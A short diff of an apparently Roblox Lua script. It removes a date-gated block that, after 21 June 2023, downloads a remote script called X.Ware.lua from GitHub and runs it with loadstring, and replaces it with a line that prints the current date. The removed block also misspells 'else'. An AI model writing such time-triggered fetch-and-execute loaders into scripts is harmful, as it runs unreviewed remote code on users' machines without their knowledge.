@@ -1,7 +1,2 @@
-local current_time = os.time()
-local target_time = os.time({year=2023, month=6, day=21, hour=19, min=10})
-if current_time > target_time then
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/k1nghatred/X.Ware/main/X.Ware.lua", true))()
-esle
-    print('ERROR')
-end
+local currentDate = os.date("%Y-%m-%d")
+print(currentDate)
